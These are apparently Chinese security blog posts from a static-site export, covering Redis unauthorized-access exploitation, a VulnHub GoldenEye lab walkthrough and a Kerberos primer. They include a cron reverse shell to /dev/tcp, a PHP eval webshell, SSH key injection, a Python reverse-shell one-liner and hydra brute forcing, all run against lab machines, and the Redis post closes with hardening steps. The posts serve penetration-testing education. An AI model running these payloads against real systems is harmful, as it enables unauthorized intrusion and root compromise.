<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> aaa <span class="string">&quot;nnnn* * * * * root ln -s -f bash /bin/shnnnn&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/cron.d</span><br><span class="line">config <span class="built_in">set</span> dbfilename step1</span><br><span class="line">save</span><br><span class="line"><span class="built_in">set</span> bbb <span class="string">&quot;nnnn* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1nnnn&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/cron.d</span><br><span class="line">config <span class="built_in">set</span> dbfilename step2</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>成功创建任务计划step1和step2，但是还是无法反弹shell。错误日志显示语法错误</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/14.png"></p>
<p>原因：redis向任务计划文件里写内容出现乱码而导致的语法错误。</p>
<ul>
<li>centos会忽略乱码去执行格式正确的任务计划</li>
<li>ubuntu并不会忽略这些乱码，所以导致命令执行失败，作为正常用户向/etc/cron.d目录下写任务计划文件时，命令可以正常执行。利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据</li>
</ul>
<h1 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h1><p>具体环境搭建不再赘述</p>
<p>靶机：CentOS 192.168.140.132</p>
<p>攻击机：Kali  192.168.140.130</p>
<p>CentOS启动redis服务：</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/15.png"></p>
<p>kali监听本机9999端口的返回任务</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/17.png"></p>
<p>kali写入定时任务</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/16.png"></p>
<p>写入成功，直接拿到root下的bash</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/18.png"></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>ubuntu确实设计比centos安全，建议遇到ubuntu还是用其他两种方式。具体利用方式参考上一篇文章。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://cloud.tencent.com/developer/news/301606">https://cloud.tencent.com/developer/news/301606</a></li>
<li><a href="https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/">https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/</a></li>
<li><a href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
<li>Linux日志排查：<a href="https://baijiahao.baidu.com/s?id=1613381635234443098&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1613381635234443098&amp;wfr=spider&amp;for=pc</a></li>
</ol>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>redis未授权</tag>
        <tag>网络空间安全</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权总结</title>
    <url>/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结过的内容被自己的windows defender杀掉了，现哭着再总结一次。起因源于之前参加hvv遇到此洞，故而作此总结。</p>
<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>用ANSI  C写的redis作为非关系型内存数据库，是key-value存储系统，且支持主从服务器同步。redis漏洞产生的原因一般是：</p>
<ul>
<li><strong>直接暴露在公网</strong>：绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略</li>
<li><strong>没有设置密码认证</strong>(一般为空)：可以免密远程登录redis服务</li>
</ul>
<p>漏洞可能产生的危害:</p>
<p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</p>
<p>下图为redis拿shell的三种方式及其条件：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.jpg"></p>
<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>靶机：Ubuntu 192.168.140.129</p>
<p>攻击机：kali 192.168.140.130</p>
<p>kali一键安装redis，sudo apt install redis</p>
<p>Ubuntu debian或其他环境安装指南：</p>
<p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzvf redis-6.0.1.tar.gz</span><br><span class="line">mv redis-6.0.1 /usr/local/redis</span><br><span class="line">cd /usr/local/redis</span><br><span class="line">make &amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 任意目录启动</span></span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cp redis.conf /etc</span><br></pre></td></tr></table></figure>

<p>配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>

<p>当然，别忘了，ubuntu要启动redis-server服务。</p>
<p>为保证后面写入计划任务，此处以root权限启动redis</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
<h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
<p>晓得绝对路径</p>
<p>当然还要有写入权限</p>
<h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -h  192.168.140.129 or 域名</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置写入文件</span></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以键值对的形式写入一句话木马</span></span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;swanq&#x27;]);?&gt;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存写入硬盘</span></span><br><span class="line">save </span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/1.png"></p>
<p>最后用蚁剑连接即可：<code>http://192.168.127.139/1.php</code></p>
<h2 id="2-写ssh公钥"><a href="#2-写ssh公钥" class="headerlink" title="2. 写ssh公钥"></a>2. 写ssh公钥</h2><p>原理：Redis 未授权访问通过写 <code>/root/.ssh</code>下的authorized_keys 来拿权限</p>
<h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>对外开启ssh服务</p>
<p>Redis 服务运行在 root 用户下（否则还要猜测用户）</p>
<h3 id="流程：-1"><a href="#流程：-1" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>生成本机ssh公私钥</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.png"></p>
<p>为防止脏数据污染公钥，在公钥内容上下加空行。之后将公钥写入key.txt</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/3.png"></p>
<blockquote>
<p>shell的echo :</p>
<p>用于字符串输出，其注意事项如下图所示：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
</blockquote>
<p>redis远程连接靶机，将公钥文件key.txt写入靶机</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/4.png"></p>
<blockquote>
<p>-x：read last argument from STDIN</p>
<p>cat key.txt | redis -h 192.168.140.129 -x set crack：</p>
<ul>
<li><p>cat key.txt 输出 作为后面的输入</p>
</li>
<li><p>-x 读取标准输入</p>
</li>
<li><p>set crack 是将读取的输入作为crack此参数内容</p>
<p>相当于把参数crack参数和-x读的数据组了个命令执行</p>
</li>
</ul>
</blockquote>
<p>找到靶机redis备份路径：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
<p>更改redis备份路径为ssh公钥存放目录/home/glory/.ssh,默认情况为/root/.ssh。并设置上传公钥文件名为authorized_keys</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/5.png"></p>
<blockquote>
<p>config:可查看或设置配置项</p>
<p>dbfilename:备份文件</p>
</blockquote>
<p>SSH远程登陆成功</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
<p>多见于CentOs使用</p>
<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
<blockquote>
<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
</blockquote>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
<p>观察到此时并无反弹shell。但是确实写入成功。</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
<p>具体排查问题另起一篇博客说明。</p>
<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>

<h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>

<h4 id="3-为Redis添加密码验证"><a href="#3-为Redis添加密码验证" class="headerlink" title="3.为Redis添加密码验证"></a>3.为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>

<h4 id="4-禁止外网访问-Redis"><a href="#4-禁止外网访问-Redis" class="headerlink" title="4.禁止外网访问 Redis"></a>4.禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>

<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>下载链接：<a href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
<li><a href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
<li><a href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
<li>redis相关：<a href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
<li>corntab命令参考：<a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
</ol>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
        <tag>redis未授权</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub靶机系列：GoldenEye渗透Writeup</title>
    <url>/2021/05/28/VulnHub-GoldenEye/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>定个小目标，把50台vulhub玩一遍，探探其中奥秘。当然最终目标是获取root权限或者admin账号密码。本靶场目标是获取root目录下flag.txt文件。</p>
<h1 id="0x01-靶机环境"><a href="#0x01-靶机环境" class="headerlink" title="0x01 靶机环境"></a>0x01 靶机环境</h1><p>靶机：GoldenEye 192.168.140.133</p>
<p>攻击机：kali 192.168.140.128</p>
<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><h2 id="获取目标IP"><a href="#获取目标IP" class="headerlink" title="获取目标IP"></a>获取目标IP</h2><p>首先需要找到攻击目标,nmap -sP 192.168.140.0/24</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/1.png"></p>
<h2 id="端口及服务扫描"><a href="#端口及服务扫描" class="headerlink" title="端口及服务扫描"></a>端口及服务扫描</h2><p>找到IP地址之后去探测目标机子上开了哪些服务和端口 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.140.133</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/28/VulnHub-GoldenEye/2.png"></p>
<p>共开放了4个端口，80端口web服务不可以访问。第一次遇到这种问题。nmap既然可以扫描到靶机，说明攻击机和靶机之间可以ping通，再试试宿主机ping虚拟机，发现不可以，查询ip之后，发现宿主机和虚拟机并不在同一个网段上，那就改了罢</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/3.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/4.png"></p>
<h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><p>成功ping通，访问web服务，同时也解决掉了之前MobaXterm的疑惑</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/5.png"></p>
<p>看到此图的提示，进入/sev-home/目录中，发现登陆框，一定是要找相关用户名和密码。回到刚才的首页，F12看到terminal.js。</p>
<p>通过报错信息也可看到中间件为apache</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/6.png"></p>
<p>访问terminal.js看到以下信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/7.png"></p>
<p>用burp的decoder模块解密密码，登陆成功，此处用户名一定是小写。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/8.png"></p>
<blockquote>
<p>加密格式总结：</p>
<ul>
<li>Unicode：\u开头</li>
<li>UTF8/URL：%开头</li>
<li>UTF16：\x开头</li>
<li>&amp;#73;：　73为ASCII码，对应I</li>
</ul>
</blockquote>
<p>靶机在某个较高端口上开了pop3服务，此处指55007。pop3为邮件服务器</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/9.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/10.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/19.png"></p>
<p>terminal.js中写道，make sure you update your default password(建议改成make sure to update your passwd),也就是说目前是默认密码。用户名为boris,暴力破解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L 1.txt -P /usr/share/wordlists/fasttrack.txt  192.168.140.133 -s 55007 pop3</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/28/VulnHub-GoldenEye/11.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/12.png"></p>
<p>密码为 secret1!</p>
<p>通过nc telnet连接pop3，登陆并查看boris的邮件信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/13.png"></p>
<p>其中三封邮件内容如下，</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/14.png"></p>
<p>root发给boris的邮件</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/15.png"></p>
<p>natalya发给boris的邮件</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/16.png"></p>
<p>alec发给boris的邮件</p>
<p>再查看natalya的邮件有什么信息。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/17.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/18.png"></p>
<p>得到用户名密码、服务器域名和网址，可在/etc/hosts可添加信息后访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Domain: severnaya-station.com&#x2F;gnocertdir</span><br><span class="line"></span><br><span class="line">point this servers IP to severnaya-station.com in &#x2F;etc&#x2F;hosts.</span><br></pre></td></tr></table></figure>

<p>打开本机/etc/hosts。添加域信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/20.png"></p>
<p>登陆网站看到登陆框，此处是一个开源的CMS系统moodle，用刚才得到的用户名和密码登陆即可</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/21.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/22.png"></p>
<p>找到一封相关的邮件，邮件中标注doak的用户名：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/23.png"></p>
<p>知道用户名继续hydra爆破，登陆邮件服务器：</p>
<p>此处因为实习原因，电脑更换，内网IP有所差，但实验内容不变。IP变为如下内容：</p>
<p>靶机：GoldenEye 192.168.221.128</p>
<p>攻击机：kali 192.168.221.130</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/24.png"></p>
<p>得到doak的CMS的账户密码：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/25.png"></p>
<p>登陆CMS发现在doak隐私文件目录下for james文件下有一个txt文本，文本内容如下所示：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/26.png"></p>
<p>找到一个jpg文件位于以下位置：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/27.png"></p>
<p>使用wget下载到本地，并用strings或exiftool检查图片内容，发现Image Description字段为可疑base64</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import base64;s&#x3D;base64.&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/28/VulnHub-GoldenEye/28.png"></p>
<p>解码后为xWinter1995x!。到此得到管理员的账号密码，所有人信息一览无余</p>
<p>账号：admin</p>
<p>密码：xWinter1995x!</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/29.png"></p>
<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><h2 id="查找历史漏洞"><a href="#查找历史漏洞" class="headerlink" title="查找历史漏洞"></a>查找历史漏洞</h2><p>已知Moodle版本为2.2.3。可能存在远程命令执行漏洞CVE-2013-3630，msf中存在此payload，不过打不通。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/30.png"></p>
<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>首先Home -&gt; Site administration -&gt; Plugins -&gt; Text editors -&gt; TinyMCE HTML editor，将Spell engine更换为PSpellShell。</p>
<p>在Home -&gt; Site administration -&gt; Server -&gt; System paths的Path to aspell处上传代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.187.128&quot;,8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>

<p>监听本机8099端口</p>
<p>并在Home -&gt; My profile -&gt; Blogs -&gt; Add a new entry中新建blog，输入任意字符，点Toggle Spellchecker。即可监听成功</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/33.png"></p>
<p>靶机上有python 考虑用python获取TTY，否则无法执行某些命令，并查看用户名、内核信息和ID</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/34.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p>根据之前获取的内核版本在Exploit-DB中找EXP</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/35.png"></p>
<h2 id="37292-c提权"><a href="#37292-c提权" class="headerlink" title="37292.c提权"></a>37292.c提权</h2><p>建立HTTP服务传输EXP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m  http.server 8000</span><br></pre></td></tr></table></figure>

<p>进入靶机/tmp目录下载EXP</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/36.png"></p>
<p>执行后提示gcc并没有安装，更改EXPgcc为cc编译</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/40.png"></p>
<p>然后重新下载shell并编译</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/37.png"></p>
<p>运行EXP成功提权，在root目录下找到.flag.txt，注意不是flag.txt</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/38.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/39.png"></p>
<p>we get it!</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/41.png"></p>
<h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><ul>
<li><p>此处apache中间件无用武之地</p>
</li>
<li><p>用户名小写我是没想到</p>
</li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>靶机地址：<a href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></li>
<li>文章参考：<a href="https://programmersought.com/article/93378040168/#_252">https://programmersought.com/article/93378040168/#_252</a></li>
<li><a href="https://www.shawroot.cc/1842.html">https://www.shawroot.cc/1842.html</a></li>
<li>nc实现telnet连接pop3：<a href="https://blog.csdn.net/LL458524906/article/details/74635272">https://blog.csdn.net/LL458524906/article/details/74635272</a></li>
<li>aspell参考：<a href="https://cloud.tencent.com/developer/article/1764068">https://cloud.tencent.com/developer/article/1764068</a></li>
<li>tty-teletypewriter：<a href="https://segmentfault.com/a/1190000038466327">https://segmentfault.com/a/1190000038466327</a></li>
</ol>
]]></content>
      <categories>
        <category>靶机Vulhub</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>CTF</tag>
        <tag>网络空间安全</tag>
        <tag>靶机渗透</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透前言之kerberos协议</title>
    <url>/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>windows认证协议主要包括两种，一种是NTLM，一种是Kerberos.</p>
<ul>
<li><p>NTLM</p>
<ol>
<li><p>使用在 Windows NT 和 Windows 2000 Server(or later)<strong>工作组环境</strong>中</p>
</li>
<li><p>基于挑战、应答的Windows 早期的认证机制，因其安全性不高，从 Windows 2000 开始已经默认不再使用</p>
</li>
</ol>
</li>
<li><p>Kerberos</p>
<ol>
<li><p>使用在<strong>域</strong>中</p>
</li>
<li><p>集中式的认证方式，整个认证过程中总共要涉及到三方:客户端、服务端和KDC</p>
</li>
</ol>
</li>
</ul>
<h1 id="0x01-Kerberos简介"><a href="#0x01-Kerberos简介" class="headerlink" title="0x01 Kerberos简介"></a>0x01 Kerberos简介</h1><p>Kerberos认证中，最主要的问题是如何证明“你是你”的问题，当一个Client去访问Server上的某服务时，Server如何判断Client是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截/篡改也不影响通讯的安全性，这正是Kerberos解决的问题。在域渗透过程中Kerberos协议的攻防也至关重要。</p>
<h2 id="1-Kerberos协议框架"><a href="#1-Kerberos协议框架" class="headerlink" title="1.Kerberos协议框架"></a>1.<strong>Kerberos协议框架</strong></h2><p>在Kerberos协议中主要是有三个角色的存在：</p>
<ul>
<li><p>访问服务的Client</p>
</li>
<li><p>提供服务的Server</p>
</li>
<li><p>KDC（Key Distribution Center）密钥分发中心</p>
<p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/1.jpg"></p>
</li>
</ul>
<p>如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是车站的认证系统。如果Client端的票据是合法的（由你本人身份证购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票只有一张。</p>
<p>由上图中可以看到<strong>KDC又分为两个部分</strong>：</p>
<p><strong>Authentication Server</strong>： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张<strong>TGT</strong>（Ticket Granting Ticket）票给Client。</p>
<p><strong>Ticket Granting Server</strong>： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（ServiceTicket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/2.jpg"></p>
<p>KDC服务框架中包含一个<strong>KRBTGT</strong>账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号，在发送票据的时候会使用到其hash。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/3.jpg"></p>
<h2 id="2-Kerberos认证-ticket-system"><a href="#2-Kerberos认证-ticket-system" class="headerlink" title="2. Kerberos认证-ticket system"></a>2. Kerberos认证-ticket system</h2><p>流程当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，然后通过AS发放的TGT向Server发起认证请求，这个过程分为三块：</p>
<p><strong>The Authentication Service Exchange</strong>：Client与AS的交互</p>
<p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client与TGS的交互</p>
<p><strong>The Client/Server Authentication Exchange</strong>：Client与Server的交互</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/4.jpg"></p>
<p><strong>(1)The Authentication Service Exchange</strong></p>
<p>KRB_AS_REQ</p>
<p>Client-&gt;AS：发送 Authenticator1(Client 加密 TimeStamp)</p>
<p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client  Hash 加密的时间戳、ClientID、网络地址、加密类型等内容。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/5.jpg"></p>
<p>KRB_AS_REP</p>
<p>AS-&gt; Client：发送 Client 加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
<p>在 KDC 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 HASH 加密的 sessionkey-as 和 TGT（由 KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp 等信息）。</p>
<p><strong>(2)TheTicket-Granting Service (TGS) Exchange</strong></p>
<p>KRB_TGS_REQ</p>
